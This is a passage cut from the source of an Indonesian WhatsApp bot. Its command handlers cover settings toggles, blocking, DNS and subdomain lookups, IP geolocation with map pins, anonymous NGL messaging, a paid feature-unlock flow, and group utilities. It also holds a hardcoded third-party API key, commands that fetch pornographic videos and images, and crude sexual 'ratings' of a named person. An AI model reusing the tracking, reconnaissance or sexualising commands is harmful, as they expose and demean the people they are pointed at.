title: "- Pilih Option Autoread",
rows: [
{ title: "Aktifkan Autoread", id: ".autoread on" }, 
{ title: "Matikan Autoread", id: ".autoread off" }
]
}, 
{
title: "- Pilih Option Autoread Sw",
rows: [
{ title: "Aktifkan Autoread Sw", id: ".autoreadsw on" }, 
{ title: "Matikan Autoread Sw", id: ".autoreadsw off" }
]
}, 
{
title: "- Pilih Option Auto Typing",
rows: [
{ title: "Aktifkan Auto Typing", id: ".autotyping on" }, 
{ title: "Matikan Auto Typing", id: ".autotyping off" }
]
}, 
{
title: "- Pilih Option Auto Promosi",
rows: [
{ title: "Aktifkan Auto Promosi", id: ".autopromosi on" }, 
{ title: "Matikan Auto Promosi", id: ".autopromosi off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: pantek}) 
await TamaMods.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc() 
if (q.toLowerCase() == "on") {
if (global.db.settings.autotyping == true) return Reply("*Auto typing* sudah aktif")
global.db.settings.autotyping = true
await Reply("*Auto typing* berhasil diaktifkan ✅")
sendStatusGc() 
} else if (q.toLowerCase() == "off") {
if (global.db.settings.autotyping == false) return Reply("*Auto typing* sudah tidak aktif")
global.db.settings.autotyping = false
await Reply("*Auto typing* berhasil dimatikan ✅")
sendStatusGc() 
} else {
return sendStatusGc() 
}}
break

//================================================================================

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
async function sendStatusGc() {
let teksnya = `
* *Autoread :* ${db.settings.autoread ? "✅" : "❌"}
* *Autoread Sw :* ${db.settings.readsw ? "✅" : "❌"}
* *Auto Typing :* ${db.settings.autotyping ? "✅" : "❌"}
* *Auto Promosi :* ${db.settings.autopromosi ? "✅" : "❌"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Pilih Option Autoread",
rows: [
{ title: "Aktifkan Autoread", id: ".autoread on" }, 
{ title: "Matikan Autoread", id: ".autoread off" }
]
}, 
{
title: "- Pilih Option Autoread Sw",
rows: [
{ title: "Aktifkan Autoread Sw", id: ".autoreadsw on" }, 
{ title: "Matikan Autoread Sw", id: ".autoreadsw off" }
]
}, 
{
title: "- Pilih Option Auto Typing",
rows: [
{ title: "Aktifkan Auto Typing", id: ".autotyping on" }, 
{ title: "Matikan Auto Typing", id: ".autotyping off" }
]
}, 
{
title: "- Pilih Option Auto Promosi",
rows: [
{ title: "Aktifkan Auto Promosi", id: ".autopromosi on" }, 
{ title: "Matikan Auto Promosi", id: ".autopromosi off" }
]
}
]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: pantek}) 
await TamaMods.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
}
if (!q) return sendStatusGc()
if (q.toLowerCase() == "on") {
if (global.db.settings.readsw == true) return Reply("*Autoread sw* sudah aktif")
global.db.settings.readsw = true
await Reply("*Autoread sw* berhasil diaktifkan ✅")
await sendStatusGc()
} else if (q.toLowerCase() == "off") {
if (global.db.settings.readsw == false) return Reply("*Autoread sw* sudah tidak aktif")
global.db.settings.readsw = false
await Reply("*Autoread sw* berhasil dimatikan ✅")
await sendStatusGc()
} else {
return sendStatusGc()
}}
break


            case 'jodoh':
            case 'jodohku': {
           if (!m.isGroup) return Reply(mess.group)
            let member = m.metadata.participants.map(v => v.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
TamaMods.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname2}`,
"body": `${global.namaowner}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": 'https://telegra.ph/file/49f2b139a2aff4bb934f7.jpg',
"sourceUrl": `${global.linkSaluran}`}}},
{ quoted: pantek})        
            }
            break
            
            case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return Reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await TamaMods.updateBlockStatus(mem, "block")
if (m.isGroup) TamaMods.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "unblok": case "unblokir": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return Reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await TamaMods.updateBlockStatus(mem, "unblock");
if (m.isGroup) TamaMods.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: pantek})
}
break
//------(Batas Case)------//
case "autoread": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return Reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return Reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return Reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return Reply("Berhasil mematikan *autoread*")
} else return Reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return Reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return Reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return Reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return Reply("Berhasil mematikan *autopromosi*")
} else return Reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return Reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return Reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return Reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return Reply("Berhasil mematikan *autotyping*")
} else return Reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return Reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return Reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return Reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return Reply("Berhasil mematikan *autoreadsw*")
} else return Reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return Reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return Reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return Reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return Reply("Berhasil mematikan *welcome* di grup ini")
} else return Reply(example("on/off"))
}
break
//------(Batas Case)------//
case "autoai": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].autoai == true) return Reply(`*autoai* di grup ini sudah aktif!`)
global.db.groups[m.chat].autoai = true
return Reply("Berhasil menyalakan *Auto-Ai* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].autoai == false) return Reply(`*Auto-Ai* di grup ini tidak aktif!`)
global.db.groups[m.chat].autoai = false
return Reply("Berhasil mematikan *Auto-Ai* di grup ini")
} else return Reply(example("on/off"))
}
break
//------(Batas Case)------//
case "cekdns": {
if (!isCreator) return Reply(mess.owner)
    try {
        // Mendapatkan target dari input pengguna
        const input = m.text.split(" ")[1]; // Memisahkan perintah dan target
        const target = input ? input.trim() : null;

        // Validasi jika target kosong atau tidak diberikan
        if (!target) {
            Reply("Mohon masukkan nama domain/subdomain yang ingin diperiksa, contohnya: `.cekdns dpr.go.id`");
            break;
        }

        // Memeriksa subdomain menggunakan endpoint API
        const result = await axios.get(`https://networkcalc.com/api/dns/lookup/${target}`);
        const data = result.data;

        // Memastikan respons memiliki format valid
        if (data && data.status === "OK" && data.records) {
            const { hostname, records } = data;

            // Menyusun pesan hasil
            let replyMessage = `*DNS Lookup Result for: ${hostname}*\n\n`;

            // Memproses record A
            if (records.A.length > 0) {
                replyMessage += "*A Records:*\n";
                records.A.forEach(record => {
                    replyMessage += `  - Address: ${record.address}\n    TTL: ${record.ttl}\n`;
                });
            } else {
                replyMessage += "*A Records:*\n  - Tidak ditemukan\n";
            }

            // Memproses record CNAME
            if (records.CNAME.length > 0) {
                replyMessage += "\n*CNAME Records:*\n";
                records.CNAME.forEach(record => {
                    replyMessage += `  - ${record}\n`;
                });
            } else {
                replyMessage += "\n*CNAME Records:*\n  - Tidak ditemukan\n";
            }

            // Menambahkan catatan jika jenis lainnya kosong
            const otherTypes = ["MX", "NS", "SOA", "TXT"];
            otherTypes.forEach(type => {
                if (records[type] && records[type].length > 0) {
                    replyMessage += `\n*${type} Records:*\n`;
                    records[type].forEach(record => {
                        replyMessage += `  - ${JSON.stringify(record)}\n`;
                    });
                } else {
                    replyMessage += `\n*${type} Records:*\n  - Tidak ditemukan\n`;
                }
            });

            // Mengirimkan hasil kepada pengguna
            Reply(replyMessage.trim());
        } else {
            Reply("Data DNS tidak valid atau tidak dapat diambil.");
        }
    } catch (error) {
        console.error(error);
        Reply("Terjadi kesalahan saat memeriksa subdomain.");
    }
}
break;

case "cekdomain":
case "cekhost": {
 if (!args[0]) return Reply('Masukkan host yang ingin dicek!\nContoh: *cekhost google.com*');
 let host = args[0];
 let apiUrl = `https://fastrestapis.fasturl.cloud/tool/checkhost?host=${host}&mode=http`;
 try {
 let response = await fetch(apiUrl);
 let data = await response.json();
 if (data.status !== 200 || !data.result) {
 return Reply('Gagal mengambil data. Pastikan host yang dimasukkan benar.');
 }
 let resultText = `🔍 Hasil Pengecekan Host: *${data.result.host}*\n\n`;
 for (let node in data.result.result) {
 let entry = data.result.result[node];
 if (!entry) continue;
 let { country_name, flag_emoji } = entry;
 let responseTime = entry[0][1].toFixed(3);
 let status = entry[0][2];
 let ip = entry[0][4];
 resultText += `${flag_emoji} *${country_name}*\n`;
 resultText += `⏱️ Waktu Respons: ${responseTime} detik\n`;
 resultText += `📡 Status: ${status}\n`;
 resultText += `🌐 IP: ${ip}\n\n`;
 }
 Reply(resultText);
 } catch (e) {
 console.error(e);
 Reply('Terjadi kesalahan saat mengambil data.');
 }
}
 break
			
			case 'cekweb': {
			if (!isCreator) return Reply(mess.owner)
				if (!text) return Reply(`*Masukan Domain Web!*\n\nContoh :\n${prefix+command} google.com`)
				if (budy.match(`/|https|http|:`)) return Reply(`*Masukan Domain Saja!*\n\nContoh:\n${prefix+command} google.com`)
				await TamaMods.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})

				axios.get(`https://api.hackertarget.com/pagelinks/?q=${text}`)
					.then(async response => {
						const pageLinks = response.data;

						const dnsResponse = await axios.get(`https://api.hackertarget.com/dnslookup/?q=${text}`);
						const dnsData = dnsResponse.data;

						const headerResponse = await axios.get(`https://api.hackertarget.com/httpheaders/?q=${text}`);
						const headerData = headerResponse.data;

						const serverResponse = await axios.get(`https://api.hackertarget.com/httpheaders/?q=${text}`);
						const serverData = serverResponse.data;

						let info = `*乂 DOMAIN CHECK*
            
*Extract Links*: 
${pageLinks.split("\n").map(link => `• ${link}`).join("\n")}

*DNS Recod*:
${dnsData}

*Headers Data*:
${headerData}

*Server Respon*:
${serverData}`;

						Reply(info);
					})
					.catch(error => {
						console.error("Error fetching website info:", error);
						Reply("Terjadi kesalahan saat mengambil informasi dari website yang dituju.");
					});
			}
			break
		
			
			case 'ngl':
			case 'sendngl': {
				if (!text) return Reply(`*Masukan Input Query!*\n\nContoh:\n${prefix+command} https://ngl.link/TamaMods73676 hallo`)
				if (!budy.match('https://ngl.link/')) return Reply(`Contoh:\n${prefix+command} https://ngl.link/TamaMods73676 hallo`)
				let [usersi, ...message] = text.split(' ');
				let userr = usersi.split('https://ngl.link/')[1]
				message = message.join(' ');
				try {
					let ngl = await axios.post("https://ngl.link/api/submit",
						`username=${userr}&question=${message}&deviceId=18d7b980-ac6a-4878-906e-087dfec6ea1b&gameSlug=&referrer=`
					);
					Reply(`*Pesan terkirim 🤓*

ID : ${ngl.data.questionId}
Region : ${ngl.data.userRegion}
`)
				} catch (error) {
        console.error("Error Send NgL:", error.message);
				}
			}
			break
			
		case "ceksubdo": {
    try {
        // Mendapatkan target dari input pengguna
        const input = m.text.split(" ")[1]; // Memisahkan perintah dan target
        const target = input ? input.trim() : null;

        // Validasi jika target kosong atau tidak diberikan
        if (!target) {
            Reply("Mohon masukkan nama domain yang ingin diperiksa, contohnya: `.ceksubdo tamadev.com`");
            break;
        }

        // Memeriksa subdomain menggunakan endpoint API WhoisXML
        const apiKey = "at_3OXsNYCCbeDeSwXkgiPhJWeTTKAzR"; // Ganti dengan API key Anda
        const result = await axios.get(`https://subdomains.whoisxmlapi.com/api/v1?apiKey=${apiKey}&domainName=${target}`);
        const data = result.data;

        // Memastikan data subdomain ada dan valid
        if (data && data.result && data.result.records && data.result.records.length > 0) {
            const subdomains = data.result.records;
            const count = data.result.count; // Total jumlah subdomain ditemukan

            // Menyusun pesan hasil
            let replyMessage = `*Subdomain Lookup Result for: ${target}*\nJumlah Subdomain: ${count}\n\n`;

            subdomains.forEach((subdomain, index) => {
                const firstSeen = new Date(subdomain.firstSeen * 1000).toLocaleString();
                const lastSeen = new Date(subdomain.lastSeen * 1000).toLocaleString();
                replyMessage += `${index + 1}. ${subdomain.domain}\n  - First Seen: ${firstSeen}\n  - Last Seen: ${lastSeen}\n`;
            });

            // Mengirimkan hasil kepada pengguna
            Reply(replyMessage.trim());
        } else {
            Reply(`Tidak ditemukan subdomain untuk target: ${target}`);
        }
    } catch (error) {
        console.error(error);
        Reply("Terjadi kesalahan saat memeriksa subdomain.");
    }
}
break;

case "ceksubdo2": {
      try {
        // Mendapatkan target dari input pengguna
        const input = m.text.split(" ")[1]; // Memisahkan perintah dan target
        const target = input ? input.trim() : null;

        // Validasi jika target kosong atau tidak diberikan
        if (!target) {
            return Reply("⚠️ Mohon masukkan nama domain yang ingin diperiksa.\n\n📌 Contoh: `.ceksubdo TamaMods.go.id`");
        }

        // Memeriksa subdomain menggunakan API HackerTarget
        const response = await axios.get(`https://api.hackertarget.com/hostsearch/?q=${target}`);
        const data = response.data;

        // Validasi hasil response
        if (!data || data.includes("error")) {
            return Reply(`❌ Tidak ditemukan subdomain untuk target: *${target}*`);
        }

        // Memproses hasil menjadi daftar yang rapi
        const lines = data.split("\n");
        let replyMessage = `🌐 *Subdomain Finder by Tama-Dev*\n🔍 Target: *${target}*\n📌 Jumlah Subdomain: *${lines.length}*\n\n`;

        lines.forEach((line, index) => {
            const [subdomain, ip] = line.split(",");
            replyMessage += `⚡ ${index + 1}. *${subdomain}*\n   ┗ 📌 IP: *${ip}*\n`;
        });

        // Mengirimkan hasil kepada pengguna
        Reply(replyMessage.trim());

    } catch (error) {
        console.error(error);
        Reply("⚠️ Terjadi kesalahan saat memeriksa subdomain.");
    }
}
break;

case "buyfitur": {
    if (!text) return Reply(example("allmenu"));

    // Daftar harga untuk setiap case
    const casePrices = {
        "allmenu": 5000,
        "jasahbpanel": 10000,
        "buyadp": 10000,
        "addscript": 5000,
        "cekweb": 5000,
        "buystoksc": 5000
    };

    // 🏷️ Ambil harga case berdasarkan input
    const caseName = text.trim(); // Nama case dari input pengguna
    const hargasc = casePrices[caseName];
    const amount = Number(hargasc) + generateRandomNumber(110, 250);
    if (!amount) {
        return Reply(
            `*Case "${caseName}"* tidak ditemukan\n\n` +
            `Pastikan nama case benar atau pilih dari daftar berikut:\n` +
            Object.keys(casePrices).map((key) => `- ${key}: Rp${casePrices[key]}`).join("\n")
        );
    }

    const UrlQr = global.qrisOrderKuota;

    const initiatePayment = async () => {
        try {
            const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`)

            const teksPembayaran = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Fitur Script Bot
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`;

            let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Fitur`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})

            db.users[m.sender].status_deposit = true;
            db.users[m.sender].deposit = {
                msg: msgQr,
                chat: m.sender,
                idDeposit: get.data.result.transactionId,
                amount: get.data.result.amount.toString(),
                exp: function () {
                    setTimeout(async () => {
                        if (db.users[m.sender].status_deposit) {
                            await TamaMods.sendMessage(
                                db.users[m.sender].deposit.chat,
                                { text: "⚠️ *QRIS pembayaran telah expired!*" },
                                { quoted: db.users[m.sender].deposit.msg }
                            );
                            await TamaMods.sendMessage(
                                db.users[m.sender].deposit.chat,
                                { delete: db.users[m.sender].deposit.msg.key }
                            );
                            db.users[m.sender].status_deposit = false;
                            delete db.users[m.sender].deposit;
                        }
                    }, 300000);
                }
            };

            await db.users[m.sender].deposit.exp();

            while (db.users[m.sender].status_deposit) {
                await sleep(8000);
                const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`)
                const req = await resultcek.data.amount;
                if (req == db.users[m.sender].deposit.amount) {
                    db.users[m.sender].status_deposit = false;

                    // ✅ Konfirmasi pembayaran berhasil
                    const getcase = (cases) => {
                        try {
                            const fileContent = fs.readFileSync('./Console/ZephCase.js').toString();
                            const regex = new RegExp(`case\\s+["']${cases}["']([\\s\\S]*?)(?=case\\s+["']|default:|\\Z)`, 'g');
                            const match = regex.exec(fileContent);

                            if (match) {
                                return "*Isi Case*: \n" + "```" + "case " + `"${cases}"` + match[1] + "```";
                            } else {
                                return null;
                            }
                        } catch (err) {
                            return null;
                        }
                    };

                    try {
                        const result = getcase(caseName);
                        if (result) {
                            Reply(
                                `*Pembayaran berhasil!* Anda sekarang memiliki akses ke case *${caseName}*.\n\n${result}`
                            );
                        } else {
                            Reply(`❌ *Case "${caseName}"* tidak ditemukan di sistem.`);
                        }
                    } catch (e) {
                        Reply(`⚠️ *Error*: ${e.message}`);
                    }

                    delete db.users[m.sender].deposit;
                    return true;
                }
            }
        } catch (e) {
            return false;
        }
    };

    const paymentSuccess = await initiatePayment();

    if (!paymentSuccess) {
        return Reply("❌ *Gagal memproses pembayaran.* Silakan coba lagi nanti.");
    }
}
break;

			case 'tagsw': {
    // Validasi role
if (!isCreator) return Reply(mess.owner)

    // Format input: <caption>,<id_grup>
    // Jika id_grup tidak disertakan, gunakan grup tempat perintah dikirim
    if (!text) return Reply("Format salah!\nContoh: .tagsw caption nya, 120363025090404508@g.us");

    let [cap, idgc] = text.split(',');
    cap = cap ? cap.trim() : "";
    idgc = idgc ? idgc.trim() : m.chat;

    let media = null;
    let options = {};
    const jids = [m.sender, m.chat];

    if (quoted) {
        const mime = quoted.mtype || quoted.mediaType || "";

        // Jika reply media
        if (mime.includes('image')) {
            media = await m.quoted.download();
            options = {
                image: media,
                caption: cap || m.quoted.text || '',
            };
        } else if (mime.includes('video')) {
            media = await m.quoted.download();
            options = {
                video: media,
                caption: cap || m.quoted.text || '',
            };
        } else if (mime.includes('audio')) {
            media = await m.quoted.download();
            options = {
                audio: media,
                mimetype: 'audio/mp4',
                ptt: true, // Ubah ke true jika ingin jadi voice note
            };
        } else {
            // Jika bukan image/video/audio, kirim teks
            options = {
                text: cap || m.quoted.text || '',
            };
        }
    } else {
        // Jika tidak reply media, hanya teks
        options = {
            text: cap,
        };
    }

    try {
        // Ambil daftar member grup
        const groupMeta = await TamaMods.groupMetadata(idgc);
        const participants = groupMeta.participants.map(a => a.id);

        // Kirim ke status@broadcast dengan mention semua member
        return TamaMods.sendMessage("status@broadcast", options, {
            backgroundColor: "#7ACAA7",
            textArgb: 0xffffffff,
            font: 1,
            statusJidList: participants,
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: jids.map(() => ({
                                tag: "to",
                                attrs: { jid: idgc },
                                content: undefined,
                            })),
                        },
                    ],
                },
            ],
        });
    } catch (err) {
        console.error("Error tagsw:", err);
        return Reply("❌ Terjadi kesalahan saat mengirim status.");
    }
}
break
//------(Batas Case)------//
case "videy":
case "videyvid": {
  if (!text) return Reply(example("link nya"))
  let anu = `https://vapis.my.id/api/videy?url=${encodeURIComponent(text)}`;
  const res = await fetch(anu);
  const response = await res.json();
  try {
    TamaMods.sendMessage(m.chat, {
      video: { url: response.data },
      mimeType: 'video/mp4',
      caption: 'Succes.'
    }, { quoted: pantek }) //Ganti Ke m aja :v
  } catch (e) {
    console.log(e);
    Reply('Gagal Ngentot :v')
  }
}
break
//------(Batas Case)------//
case 'gcsider':
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.isGroup) { GcSiderUpdate(m.sender,m.chat) }
const sevenDaysAgo = timestamp - (7 * 24 * 60 * 60 * 1000);
const filteredData = db_sider[m.chat].filter(item => item.timestamp >= sevenDaysAgo);
const newDataSider = groupMetadata.participants.filter(item2 => !filteredData.some(item1 => item1.user_id === item2.id));

let arr_membersider = ''
for (let mem of newDataSider) {
arr_membersider += `⭔ @${mem.id.split('@')[0]} _Sider_\n`
}

let mem_sider       = newDataSider.length
let total_memgc     = groupMetadata.size
let teks_gcsider    = `_*${mem_sider} Dari ${total_memgc}* Anggota Grup ${groupMetadata.subject} Adalah Sider_

_*Dengan Alasan :*_
➊ _Tidak Aktif Selama lebih 7 hari_
➋ _Join Tapi Tidak Pernah Nimbrung_

_Harap Aktif Di Grup Karena Akan Ada Pembersihan Member Setiap Saat_


_*List Member Sider*_
${arr_membersider}
`

TamaMods.sendMessage(m.chat, { text: teks_gcsider, mentions: newDataSider.map(a => a.id) }, { quoted:pantek })


break



case 'trackip':
{
if (!text) return Reply(`*Example :* ${prefix+command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await TamaMods.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
Reply(formatIPInfo(res)); 
} catch (e) { 
Reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break
//------(Batas Case)------//
case 'buatgc': 
case 'creategc':
case 'creategroup': {
if (!isCreator) return Reply(mess.owner)
if (!args.join(" ")) return Reply(example("nama group nya"))
try {
let cret = await TamaMods.groupCreate(args.join(" "), [])
let response = await TamaMods.groupInviteCode(cret.id)
let teks2 = `      [ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id : ${cret.id}
▸ Join : chat.whatsapp.com/${response}`
Reply(teks2)
} catch {
Reply("sukses!")
}
}
break
//------(Batas Case)------//
case 'pornhub':
if (!text) return Reply(example("input link"))
try {
let res = await searchVideo(text)
let teks = res.map((item, index) => {
    return `*[ RESULT ${index + 1} ]*
*Link :* ${item.link}
*Title :* ${item.title}
*Uploader :* ${item.uploader}
*Views :* ${item.views}
*Duration :* ${item.duration}
`
}).filter(v => v).join("\n")
await Reply(teks)
} catch (e) {
await Reply(eror)
}
break
//------(Batas Case)------//
case 'bokep': case 'hentaivid2': {
Reply(mess.wait)
let sbe = await hentaivid()
let cejd = sbe[Math.floor(Math.random(), sbe.length)]
TamaMods.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: pantek })
}
break
//------(Batas Case)------//
case 'paptt1': {
teks28 = `cabul njir 💦`
TamaMods.sendMessage(from, { image: { url: "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg" }, caption: teks28 }, { quoted: pantek })
}
break
//----------(Batas Case)----------//
case 'paptt2': {
teks28 = `cabul njir 💦`
TamaMods.sendMessage(from, { image: { url: "https://telegra.ph/file/0e5be819fa70516f63766.jpg" }, caption: teks28 }, { quoted: pantek })
}
break
//------(Batas Case)------//
case 'cekmemek': {
if (!text) return Reply(example("nama orangnya"))
Reply(`
╭━━━━°「 *Memek ${text}* 」°
┃
┊• Nama : ${text}
┃• memek : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• lubang : ${pickRandom(['perawan','ga perawan','udah pernah dimasukin','masih rapet','tembem'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
╰═┅═━––––––๑`)
}
break
//----------(Batas Case)----------//
case 'cekkontol': {
if (!text) return Reply(example("nama orangnya"))
Reply(`
╭━━━━°「 *Komtol ${text}* 」°
┃
┊• Nama : ${text}
┃• komtol : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• ukuran : ${pickRandom(['5cm','10cm','7cm','9cm','15cm','100cm'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
╰═┅═━––––––๑`)
}
break
//------(Batas Case)------//
case 'tambah':{
if (!text) return Reply(example("20+2"))
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
Reply(`${nilai_one + nilai_two}`)}
break
//----------(Batas Case)----------//
case 'kurang':{
if (!text) return Reply(example("20-10"))
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
